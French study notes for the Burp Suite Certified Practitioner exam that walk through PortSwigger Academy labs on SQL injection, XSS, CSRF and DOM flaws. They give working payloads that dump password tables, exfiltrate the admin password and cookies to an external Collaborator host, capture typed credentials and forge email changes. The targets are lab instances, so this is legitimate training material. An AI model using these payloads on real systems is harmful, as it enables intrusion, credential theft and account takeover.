# Labs PortSwigger - Préparation BSCP

https://portswigger.net/web-security/all-labs 

## === SQL ===

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    GET /filter?category=Lifestyle’+OR+1=1--

### SQL injection vulnerability allowing login bypass

    administrator’--
    
### SQL injection attack, querying the database type and version on Oracle

	GET /filter?category=Gifts‘+UNION+SELECT+'abc','def'+FROM+dual–
	GET /filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
    
### SQL injection attack, querying the database type and version on MySQL and Microsoft

    GET /filter?category='+UNION+SELECT+@@version,+NULL#

###  SQL injection attack, listing the database contents on non-Oracle databases

	GET /filter?category=Pets'+UNION+SELECT+'1'--
    GET /filter?category=Pets'+UNION+SELECT+'1','2'--
    GET /filter?category=Pets'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
	GET /filter?category=Pets'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ikwqbr'--
	GET /filter?category=Pets'+UNION+SELECT+username_qtcsru,+password_vgkvts+FROM+users_ikwqbr--

### SQL injection attack, listing the database contents on Oracle

    GET /filter?category='+UNION+SELECT+'abc','def'+FROM+dual--
    GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables–
    GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_WQIUUS'-- HTTP/2
    GET /filter?category='+UNION+SELECT+USERNAME_FJLMOM,+PASSWORD_CCZEKZ+FROM+USERS_WQIUUS--

### SQL injection UNION attack, determining the number of columns returned by the query

	GET /filter?category=Gifts'+UNION+SELECT+NULL--
	GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--
	GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
    
### SQL injection UNION attack, finding a column containing text

	[...]
	GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--
	[...]
	GET /filter?category=Pets'+UNION+SELECT+NULL,'EHvVry',NULL--
    
### SQL injection UNION attack, retrieving data from other tables

	GET /filter?category=Pets'+UNION+SELECT+NULL,NULL--
	GET /filter?category=Pets'+UNION+SELECT+username,+password+FROM+users--

### SQL injection UNION attack, retrieving multiple values in a single column

    '+UNION+SELECT+NULL,'abc'--
    '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
    
### Blind SQL injection with conditional responses

Observer une requête classique vers l’accueil et remarquer le cookie : 

> Cookie: TrackingId=AsEECmnKwKq4S8Dz;session=4v8uojPB68SuAE0HldN5njc1sQTPnqIp

En injectant un payload de type **' AND '1'='1** on voit que le message d'accueil est le même.

En injectant un payload de type **' AND '1'='2** on voit que le message d'accueil n'est plus là.

Suite de payloads suivant ce même principe et permettant de déterminer qu'il y a bien un utilisateur "administrateur" et que son mot de passe fait 20 caractères : 

    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT 'a' FROM users LIMIT 1)='a
    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT 'a' FROM users WHERE username='administrator')='a
    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
    [...]
    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a

Payloads à utiliser sur Intruder pour deviner chaque caractère du mot de passe : 

    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
    [...]
    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT SUBSTRING(password,20,1) FROM users WHERE username='administrator')='a

Penser à aller dans la partie "Grep - Match" d'Intruder et à y entrer le message "Welcome back" pour avoir un facteur de discrimination des différents résultats.

Bien utiliser le TrackingId donné par le site pour ne pas invalider la condition.


### Blind SQL injection with conditional errors

En ajoutant un guillemet simple sur le paramètre "TrackingId" on observe une erreur.

En ajoutant un deuxième guillemet simple on observe que l'erreur disparaît : 

    TrackingId=Kbr9BLU0GzlbKuFw'         => Erreur
    TrackingId=Kbr9BLU0GzlbKuFw''        => Ok
    
On peut exploiter cette différence de traitement avec des sous-requêtes : 

    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT '' FROM dual)||'
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT '' FROM not-a-real-table)||'
    
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    
    
Payloads pour déterminer la longueur du mot de passe : 

    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    [...]
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Requêtes à mettre dans Intruder pour trouver chaque caractère de ce mot de passe : 

    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    [...]
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN SUBSTR(password,20,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    

Il suffit ensuite, pour chaque attaque Intruder, d'isoler la seule réponse dont le code de retour est 500.


### Visible error-based SQL injection

Dans l'historique Burp, trouver une requête avec le cookie "TrackingId" mentionné dans la consigne. Ajouter un guillemet simple dans ce paramètre, observer l'erreur renvoyée en réponse. Cette erreur contient la requête SQL passée au serveur.

Suite de payloads à utiliser pour exploiter cette requête plus en profondeur :

    TrackingId=ogAZZfxtOKUELbuJ'--
    TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
    TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- 
    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

On convertit en int puis réduit le résultat à une seule entrée parce que l'erreur SQL renvoyée nous le demande. Une fois ces ajustements faits, les données se trouvent à la fin de l'erreur 500 renvoyée par le serveur.



### Blind SQL injection with time delays

    TrackingId=x'||pg_sleep(10)--
    
### Blind SQL injection with time delays and information retrieval


Tests initiaux : 

    TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    
    TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Déduction de la longueur du mot de passe de l'administrateur : 

    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    [...] 
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    
Utilisation d'Intruder pour déduire chaque caractère du 1 au 20 : 

    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
    [...]
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
    
Attention à bien remplir les payloads : **un seul caractère alphanumérique ou éventuellement un symbole**

Attention à bien envoyer les requêtes dans un seul thread pour ne pas fausser le temps obtenu : 
**"Resource pool" => "Maximum concurrent requests" => 1**

Attention à bien afficher le timer pour la réponse obtenue : 
**"Columns" => "Response received"**


### Blind SQL injection with out-of-band interaction
   
Injecter le payload suivant dans le paramètre TrackingId : 

    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//gcw5p5877y8iiifjnkat2gp28tek2aqz.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

Observer la requête qui arrive dans Collaborator.


### Blind SQL injection with out-of-band data exfiltration

    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.gcw5p5877y8iiifjnkat2gp28tek2aqz.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

### SQL injection with filter bypass via XML encoding

Sur la page de n'importe quel produit, on observe que la fonction "Check stock" passe du XML au serveur dans une requête POST : 

    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>3</productId>
        <storeId>1</storeId>
    </stockCheck>

En testant des payloads de calcul, on voit que le résultat est évalué : 

    <storeId>1+1</storeId>
    
En testant un payload de UNION-based SQLI, on voit qu'un WAF nous a bloqué : 

    <storeId>1 UNION SELECT NULL</storeId>
    
> HTTP/2 403 Forbidden
> Content-Type: application/json; charset=utf-8
> X-Frame-Options: SAMEORIGIN
> Content-Length: 17

> "Attack detected"


Comme on injecte du XML, il est peut-être possible de contourner ce WAF grâce à un bypass inspiré des failles XXE. 
Voir : 
- https://portswigger.net/web-security/xxe/xml-entities
- https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100


Payload final : 

    <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>




## === Cross-site scripting ===

### Reflected XSS into HTML context with nothing encoded

Mettre “<script>alert(1)</script>” dans la barre de recherche.

### Stored XSS into HTML context with nothing encoded

Mettre “<script>alert(1)</script>” dans le commentaire.

### DOM XSS in document.write sink using source location.search

Entrer n’importe quoi dans la barre de recherche.
Remarquer le morceau suivant dans le code source : 

    function trackSearch(query) {
       document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if (query) {
       trackSearch(query);
    }


Envoyer le payload suivant dans la barre de recherche : 

    "><svg onload=alert(1)>

### DOM XSS in innerHTML sink using source location.search

Entrer n’importe quoi dans la barre de recherche.

Remarquer le morceau suivant dans le code source :

    <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
                            <script>
                                function doSearchQuery(query) {
                                    document.getElementById('searchMessage').innerHTML = query;
                                }
                                var query = (new URLSearchParams(window.location.search)).get('search');
                                if(query) {
                                    doSearchQuery(query);
                                }
                            </script>

Entrer le payload suivant dans la barre de recherche : 

    <img src=1 onerror=alert(1)>
    
### DOM XSS in jQuery anchor href attribute sink using location.search source

Cliquer sur le lien “Submit feedback” et remarquer que l’URL se termine par “/feedback?returnPath=/”

Changer le paramètre en “?returnPath=/AAAA” par exemple.

Remarquer le morceau de code suivant : 

    $(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); 
    });

Remarquer que notre valeur est insérée comme suit : 

    <a id="backLink" href="/AAAA">Back</a>

Répéter l’opération mais remplacer le paramètre par : 

    “?returnPath=javascript:alert(document.cookie)”

### DOM XSS in jQuery selector sink using a hashchange event

Remarquer le morceau suivant dans le code source : 

    $(window).on('hashchange', function(){
                                var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                                if (post) post.get(0).scrollIntoView();
                            }); 

Aller dans la partie “Go to exploit server” et mettre le payload suivant dans le body : 

    <iframe src="https://0aec002b04b2eb90807295f2009e00e0.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

Cliquer sur “Store” puis “Deliver exploit to victim”

### Reflected XSS into attribute with angle brackets HTML-encoded

Faire une recherche classique et voir le morceau suivant dans la réponse : 

    <input type=text placeholder='Search the blog...' name=search value="aaa">

La recherche est donc reflétée dans un attribut.
Répéter l’opération et injecter le payload suivant à la place : 

    "onmouseover="alert(1)

Rafraichir la page et passer la souris sur la barre de recherche, le payload est exécuté.

### Stored XSS into anchor href attribute with double quotes HTML-encoded 

Aller sur n’importe quel post et écrire un commentaire.

Voir le morceau suivant dans la nouvelle page : 

    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="a">a</a> | 05 October 2023
    </p>
    <p>AAA</p>

Notre site web est reflété dans un attribut href qui est ajouté sur notre nom.
Répéter l’opération et injecter le payload suivant à la place : 

	javascript:alert(2)

Après retour sur les commentaires, cliquer sur le nom de l’attaquant déclenche le payload.


### Reflected XSS into a JavaScript string with angle brackets HTML encoded

Faire une recherche classique et repérer le morceau suivant dans le code source de la réponse : 

    var searchTerms = 'a';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');

Injecter le payload suivant dans la barre de recherche : 

    a' ; alert(1) ; //


### DOM XSS in document.write sink using source location.search inside a select element

Dans la page de n’importe quel produit, remarquer le morceau suivant : 

    “var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');”

Ajouter un “&storeId=12345” à la fin de l’URL et voir que ce paramètre a bien été impacté dans le menu déroulant.

Répéter la même opération avec le payload suivant : 

    "></select><img%20src=1%20onerror=alert(1)>
    
### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

En tentant un payload classique dans la barre de recherche, on voit que les chevrons et les guillemets sont encodés : 

    <h1>0 search results for 'aaa&apos; &lt;script&gt; alert(1) &lt;/script&gt;'</h1>

Remarquer le “<body ng-app\>” qui englobe toute la page.

Entrer le payload suivant dans la barre de recherche :

    {{$on.constructor('alert(1)')()}}

### Reflected DOM XSS

Remarquer que le contenu de la recherche est exploité par un autre script : 

	<script src='/resources/js/searchResults.js'></script>
    <script>search('search-results')</script>

Intercepter une recherche classique avec Burp pour en observer le fonctionnement.

On peut voir que la recherche se fait en deux étapes : 

    GET /?search=XSS HTTP/2
    ...
    GET /search-results?search=XSS HTTP/2

On voit que la réponse à la deuxième requête a cette structure : 

    {"results":[],"searchTerm":"XSS"}

En observant le code du script searchResults.js on observe le morceau suivant : 

    if (this.readyState == 4 && this.status == 200) {
                eval('var searchResultsObj = ' + this.responseText);
                displaySearchResults(searchResultsObj);
            }

Envoyer la deuxième requête dans le Repeater et tester tous les symboles classiques pour vérifier lesquels sont gérés : \ “ ‘ ; < > 

On observe que les guillemets sont échappés mais pas les antislashs, on peut donc annuler n’importe quel échappement de caractère en ajoutant un antislash avant.

Entrer le payload suivant dans la barre de recherche : 

    \"-alert(1)}//

### Stored DOM XSS

Dans le code source de la page des commentaires sur n’importe quel post, on remarque le morceau suivant : 

    <script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
    <script>loadComments('/post/comment')</script>

Dans le code source du script externe, on voit que la fonction d’échappement des chevrons est la suivante : 

    function escapeHTML(html) {
            return html.replace('<', '&lt;').replace('>', '&gt;');
        }

La fonction replace() ne remplace que la première occurrence, on peut donc la contourner avec des payloads commençant par “<>” par exemple.

Ecrire un commentaire contenant le payload suivant : 

    <><img src=1 onerror=alert(1)>
    
### Reflected XSS into HTML context with most tags and attributes blocked

La consigne du lab indique qu’il faut utiliser la fonction print() 

En essayant des payloads classiques, on est envoyé par le WAF sur une page disant “Tag is not allowed”, ce qui sous-entend qu’il y a des balises autorisées et des balises interdites.

On voit que notre recherche est renvoyée dans la balise suivante : 

	<h1>0 search results for 'a'</h1>

Envoyer une requête de recherche dans l’Intruder et utiliser une liste de balises comme celle-ci (colonne de gauche) pour les payloads à insérer dans “<§§>” : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

La seule réponse avec un code 200 est “body”

Répéter la même manoeuvre en mettant “<body%20§§=1>” et en utilisant la liste des events (colonne du milieu) pour les payloads.

On voit que la seule réponse avec un code 200 est pour “onresize” 

Une fois ces informations obtenues, aller dans “Go to exploit server” et mettre le payload suivant dans le body : 

    <iframe src="https://0a9600f103427bb88508962f00d80072.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

Cliquer sur “Store” puis “Deliver exploit to victim”

### Reflected XSS into HTML context with all tags blocked except custom ones

    <script>
    location = 'https://0ab2007804cb9afa816f1b1000430033.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>

### Reflected XSS with some SVG markup allowed

Faire une recherche et envoyer la requête dans l’Intruder.
Refaire la technique de l’attaque sur ce champ avec la liste des balises : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

On observe que les balises \<svg>, \<animatetransform>, \<title> et \<image> passent.

Remplacer l’ancien payload (<§§>) par \<svg>\<animatetransform%20§§=1> et relancer une attaque Intruder avec cette fois la liste des évènements au lieu des balises. 

On observe que seul l’évènement "onbegin" passe. 

Utiliser ces informations pour constituer le payload final : 

> https://0a21001a04671a1380eb4ec9001800f3.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

### Reflected XSS in canonical link tag

La consigne nous dit que le challenge doit se faire sur Chrome, et que l’utilisateur ciblé va faire plusieurs combinaisons de touches avec “X”.

Voir : https://developer.mozilla.org/fr/docs/Web/HTML/Global_attributes/accesskey 

Remplacer l’URL par le payload suivant : 

> https://0ab4004c0423461f80133f6c002300fa.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) 

### Reflected XSS into a JavaScript string with single quote and backslash escaped

Faire une recherche banale puis observer le code source de la réponse. On remarque le morceau suivant : 

    <script>
        var searchTerms = 'aaa';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

Quand on essaye d’injecter un guillemet simple, on voit que la recherche est reflétée de la manière suivante : 

    var searchTerms = 'a\'';

En essayant d’ajouter un antislash pour contourner ce problème, on remarque qu’il est échappé aussi : 

	var searchTerms = 'a\\\'';

Injecter le payload suivant à la place : 

    </script><script>alert(1)</script>

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Faire une recherche banale puis observer le code source de la réponse. On remarque le morceau suivant : 

    <script>
    var searchTerms = 'aaa';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

En testant quelques payloads comme pour le lab précédent, on voit que le guillemet simple est échappé mais pas l’antislash. 

Injecter le payload suivant dans la recherche : 

    a\' ; alert(1); //
    
### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

En postant un commentaire simple, on observe que le nom de notre site web est reflété dans un attribut “onclick” : 

    …
    <img src="/resources/images/avatarDefault.svg" class="avatar"> <a id="author" href="http://site.fr" onclick="var tracker={track(){}};tracker.track('http://site.fr');">nnn</a> | 20 October 2023
    …

Poster un commentaire en renseignant le payload suivant pour notre site web : 

> http://foo?&apos;-alert(1)-&apos;

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

En faisant une recherche classique, on voit que notre entrée est reflétée dans le morceau de Javascript suivant : 

    <script>
    var message = `0 search results for 'aaa'`;
    document.getElementById('searchMessage').innerText = message;
    </script>

Ces backquotes indiquent une template string, et il est possible d’injecter des expressions dedans avec “${expression}” par exemple.

Voir : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals 

Injecter le payload suivant dans la barre de recherche : 

    ${alert(1)}

### Exploiting cross-site scripting to steal cookies

Aller sur n'importe quel post du site et mettre un commentaire avec le payload suivant :

    <script>
    fetch('https://q2tvkl5p1jxsr2xxivm9q9w0oruii86x.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
    </script>

Le cookie arrive dans Collaborator => Requête HTTP => Request to Collaborator

Reprendre la ligne du cookie et l'ajouter dans la requête vers la page /my-account que l'on aura au préalable envoyée sur le Repeater.

### Exploiting cross-site scripting to capture passwords

Aller sur n'importe quel post du site et mettre un commentaire avec le payload suivant :

    <input name=username id=username>
    <input type=password name=password onchange="if(this.value.length)fetch('https://q2tvkl5p1jxsr2xxivm9q9w0oruii86x.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
    });">
    
Récupérer les identifiants dans le Collaborator.

### Exploiting XSS to perform CSRF

Aller sur n'importe quel post du site et mettre un commentaire avec le payload suivant : 

    <script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
    };
    </script>
    

### (EXPERT) Reflected XSS with AngularJS sandbox escape without strings

    
    ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1


### (EXPERT) Reflected XSS with AngularJS sandbox escape and CSP

    <script> location='https://0aac00e3037791228023b26900d800bb.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>


### (EXPERT) Reflected XSS with event handlers and href attributes blocked

https://0a8f002704b50f3e83acec0b00cb0070.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

### (EXPERT) Reflected XSS in a JavaScript URL with some characters blocked

https://0a61006b0327942c816a7fab008c0040.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

### (EXPERT) Reflected XSS protected by very strict CSP, with dangling markup attack 

TO DO

Une XSS se trouve dans le paramètre "email" de la fonctionnalité de changement d'adresse.



### (EXPERT) Reflected XSS protected by CSP, with CSP bypass

https://0a81002b0431f3f3817103770080005a.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27 



## === CSRF ===

### CSRF vulnerability with no defenses

Faire une requête de changement d'adresse mail classique sur le compte fourni.

Récupérer la requête sur Burp puis faire "Generate CSRF PoC".

Aller sur le serveur mis à disposition pour délivrer l'exploit, copier le PoC dedans et l'envoyer à la cible.


### CSRF where token validation depends on request method

En modifiant notre adresse mail et en observant la requête POST associée, on voit les paramètres suivants : 

    email=test%40gmail.com&csrf=eTRTboOswEpqBqMapfJx1CO3QPL6anMa
    
Si on tente de modifier le token, on obtient une erreur 400.

Cliquer sur le menu contextuel de la requête puis sur "Change request method" avant de la renvoyer. La requête est acceptée en GET.

Sur cette requête modifiée, faire "Generate CSRF PoC"

Délivrer le payload sur le serveur. 

Attention à bien changer d'adresse et à bien corriger les éventuels problèmes d'encodage.

### CSRF where token validation depends on token being present

Pareil mais ne pas changer la méthode en GET, simplement retirer le paramètre "csrf" et ne laisser que "email=test@gmail.com" dans la requête POST.

Exemple de PoC :

    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
        <form action="https://0a4400eb03b8ebf8816ec5ea00460018.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="test2@gmail.com" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
        </script>
      </body>
    </html>


### CSRF where token is not tied to user session

Se connecter avec un des deux comptes fournis, générer le PoC, et remplacer le token CSRF sur l'autre.

Il est important de bien intercepter la requête sur le premier compte et de ne pas la laisser passer, le token est à usage unique.

Simplement transférer la requête interceptée dans le Repeater avant de la jeter fonctionne aussi.


### CSRF where token is tied to non-session cookie

#### Première étape

Remarquer la ligne suivante dans la requête de changement d'adresse : 

> Cookie: session=7RRxk0eFq3ztgrEn0FBYkIqx6q95MH1J; csrfKey=yQuUE7omVwdwWkKddJm6DDTwc0EF11ZG

En changeant juste le cookie on est redirigé vers /login
En changeant juste le token CSRF on a une erreur 400

Déduction : le token CSRF n'est pas forcément lié à la session.


#### Deuxième étape

Faire une recherche classique et l'envoyer dans le Repeater. On observe que la dernière recherche effectuée est reflétée dans le header "Set-Cookie". Puisque cette fonction de recherche n'a pas de protection CSRF, on peut l'exploiter pour injecter les cookies chez la victime.

Créer une URL de ce type : 

    /?search=test%0d%0aSet-Cookie:%20csrfKey=yQuUE7omVwdwWkKddJm6DDTwc0EF11ZG%3b%20SameSite=None
    
Générer un PoC de CSRF mais remplacer le bouton d'envoi automatique par : 

    <img src="https://0ac8005403e86b048501054c008a003e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=yQuUE7omVwdwWkKddJm6DDTwc0EF11ZG%3b%20SameSite=None" onerror="document.forms[0].submit()">
    
PoC : 

    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
        <form action="https://0ac8005403e86b048501054c008a003e.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="autre_adresse@gmail.com" />
          <input type="hidden" name="csrf" value="FzYi95dvSRZv9PW3diq37M3ZA9lwXvl7" />
          <input type="submit" value="Submit request" />
        </form>
       <img src="https://0ac8005403e86b048501054c008a003e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=yQuUE7omVwdwWkKddJm6DDTwc0EF11ZG%3b%20SameSite=None" onerror="document.forms[0].submit()">
      </body>
    </html>


### CSRF where token is duplicated in cookie

Remarquer les lignes suivantes dans la requête de changement d'adresse :

> Cookie: session=r90uevTVNmqpKMVErnFcvwDakiUvjWTd; csrf=reGqTzhVmVZio5ojlhw8JoTbF38rwaCN
> ...
> email=test%40gmail.com&csrf=reGqTzhVmVZio5ojlhw8JoTbF38rwaCN


On observe que le token CSRF est dupliqué dans le header du cookie.

Comme sur le lab précédent, on observe également que la fonction de recherche n'a pas de protection CSRF. On va donc pouvoir l'exploiter pour injecter un faux cookie dans le navigateur de la victime.

PoC : 

    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
        <form action="https://0a1200480460a6e18259e87800e20073.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="autre_adresse5@gmail.com" />
          <input type="hidden" name="csrf" value="fake" />
          <input type="submit" value="Submit request" />
        </form>
    <img src="https://0a1200480460a6e18259e87800e20073.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
      </body>
    </html>


### SameSite Lax bypass via method override

En observant la requête de changement d'adresse mail, on voit qu'elle ne contient pas de mécanisme anti-CSRF, on voit juste un header de sécurité dans la réponse : 

    HTTP/2 302 Found
    Location: /my-account
    X-Frame-Options: SAMEORIGIN
    Content-Length: 0
    
On voit le même header X-Frame-Options pour la requête POST du login mais il n'y a pas de restriction SameSite explicite sur le header Set-Cookie.

Voir : https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie 


Envoyer la requête "POST /my-account/change-email" sur le Repeater et la changer en GET. On voit que l'endpoint n'accepte que les requêtes POST.

Utiliser la technique de l'overriding grâce au paramètre "_method" : 

    GET /my-account/change-email?email=test2@gmail.com&_method=POST HTTP/1.1
    
Notre adresse est bien changée en "test2@gmail.com"

Construire un exploit reproduisant cette requête.

Exemple : 

    <script>
        document.location = "https://0ab9007b04c8f44081acee7600690022.web-security-academy.net/my-account/change-email?email=test444@gmail.com&_method=POST";
    </script>

### SameSite Strict bypass via client-side redirect

Sur la requête "POST /my-account/change-email" on voit qu'il n'y a aucun token ou élément imprévisible, cette partie peut donc être vulnérable aux CSRF.

En revanche, dans la réponse à la requête "POST /login" on voit que le site spécifie explicitement "SameSite=Strict" pour les cookies, ce qui empêchera le navigateur d'inclure les cookies dans toute requête cross-site.

Dans la fonctionnalité des commentaires, on observe une redirection : 

    GET /post/comment/confirmation?postId=9 HTTP/2
    ...
    GET /resources/js/commentConfirmationRedirect.js
    
En modifiant le paramètre "postId=9" en "postId=test", on voit que la page essaye également de nous rediriger.

Injecter un chemin relatif fonctionne également. Le paramètre "postId=9/../../../my-account" nous redirige bien sur la page de modification de notre compte.

On a donc un vecteur propre au site permettant de transmettre des requêtes.

Payload final : 

    <script>
        document.location = "https://0adb0054047116ff80593f3a004900aa.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=test2@gmail.com%26submit=1";
    </script>
    
Il faut bien ajouter le paramètre "submit", et encoder le caractère '&' sous peine de sortir du paramètre "postId".

### SameSite Strict bypass via sibling domain

Envoyer des messages dans le chat et observer les websockets qui passent.
XXX TO DO


### SameSite Lax bypass via cookie refresh

X

### CSRF where Referer validation depends on header being present

X

### CSRF with broken Referer validation


## === Clickjacking ===

### Basic clickjacking with CSRF token protection

X

### Clickjacking with form input data prefilled from a URL parameter

X

### Clickjacking with a frame buster script

X

### Exploiting clickjacking vulnerability to trigger DOM-based XSS

X

### Multistep clickjacking




## === DOM-based vulnerabilities ===

### DOM XSS using web messages

On remarque le morceau suivant dans le code source de la page d'accueil : 

    <script>
        window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
        })
    </script>

Mettre le payload suivant dans le serveur d'exploitation : 

